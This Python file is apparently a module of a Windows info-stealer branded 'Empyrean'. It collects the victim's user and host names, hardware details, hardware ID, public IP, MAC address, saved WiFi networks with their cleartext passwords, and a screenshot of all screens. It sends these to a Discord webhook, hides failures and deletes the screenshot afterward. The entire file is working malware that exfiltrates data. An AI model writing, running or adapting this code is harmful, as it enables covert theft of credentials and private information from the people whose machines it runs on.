import ctypes
import os
import re
import subprocess
import uuid

import psutil
import requests
import wmi
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab


class system():
    def __init__(self, webhook: str) -> None:
        webhook = SyncWebhook.from_url(webhook)
        embed = Embed(title="\u200b", color=0x000000)

        embed.add_field(name=":bust_in_silhouette: User",
                        value=f"```Display Name: {self.get_display_name()}\nHostname: {os.getenv('COMPUTERNAME')}\nUsername: {os.getenv('USERNAME')}```", inline=False)
        embed.add_field(name="<:CPU:1004131852208066701> System",
                        value=f"```CPU: {wmi.WMI().Win32_Processor()[0].Name}\nGPU: {wmi.WMI().Win32_VideoController()[0].Name}\nRAM: {round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)}\nHWID: {self.get_hwid()}```", inline=False)
        embed.add_field(name=":floppy_disk: Disk",
                        value=f"```{self.get_disk_space()}```", inline=False)
        embed.add_field(name="<:wifi:1004131855374749807> Network",
                        value=f"```IP: {requests.get('https://api.ipify.org').text}\nMAC: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```", inline=False)
        embed.add_field(name="<:wifi:1004131855374749807> WiFi",
                        value=f"```{self.get_wifi()}```", inline=False)

        ImageGrab.grab(bbox=None, include_layered_windows=False,
                       all_screens=True, xdisplay=None).save("screenshot.png")
        embed.set_image(url="attachment://screenshot.png")

        try:
            webhook.send(embed=embed, file=File('.\\screenshot.png', filename='screenshot.png'),
                         username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
        except:
            pass

        if os.path.exists("screenshot.png"):
            os.remove("screenshot.png")

    def get_display_name(self) -> str:
        GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
        NameDisplay = 3

        size = ctypes.pointer(ctypes.c_ulong(0))
        GetUserNameEx(NameDisplay, None, size)

        nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
        GetUserNameEx(NameDisplay, nameBuffer, size)

        return nameBuffer.value

    def get_disk_space(self) -> str:
        disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Use%") + "\n"
        for part in psutil.disk_partitions(all=False):
            if os.name == 'nt':
                if 'cdrom' in part.opts or part.fstype == '':
                    continue
            usage = psutil.disk_usage(part.mountpoint)
            disk += ("{:<9} "*4).format(part.device, f"{usage.free/float(1<<30):,.0f} GB",
                                        f"{usage.total/float(1<<30):,.0f} GB", usage.percent) + "\n"

        return disk

    def get_hwid(self) -> str:
        p = subprocess.Popen("wmic csproduct get uuid", shell=True,
                             stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        hwid = ((p.stdout.read() + p.stderr.read()).decode().split("\n")[1])

        return hwid

    def get_wifi(self) -> str:
        networks, out = [], ''
        try:
            wifi = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'profiles'], shell=True,
                stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
            wifi = [i.split(":")[1][1:-1] for i in wifi if "All User Profile" in i]

            for name in wifi:
                try:
                    results = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                    results = [b.split(":")[1][1:-1]
                            for b in results if "Key Content" in b]
                except subprocess.CalledProcessError:
                    networks.append((name, ''))
                    continue

                try:
                    networks.append((name, results[0]))
                except IndexError:
                    networks.append((name, ''))
                    
        except subprocess.CalledProcessError:
            pass

        out += f'{"SSID":<20}| {"PASSWORD":<}\n'
        out += f'{"-"*20}|{"-"*29}\n'
        for name, password in networks:
            out += '{:<20}| {:<}\n'.format(name, password)

        return out
